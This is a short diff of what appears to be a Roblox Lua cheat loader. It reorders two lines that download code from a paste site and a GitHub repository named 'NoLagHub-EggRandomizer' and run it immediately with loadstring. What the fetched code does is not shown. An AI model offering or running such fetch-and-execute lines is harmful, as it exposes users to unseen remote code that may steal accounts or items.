@@ -1,2 +1,2 @@
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/JgM5ca45Ly/0", true))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLagHub-EggRandomizer/PetsAndEggs/refs/heads/main/lua"))()
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/JgM5ca45Ly/0", true))()
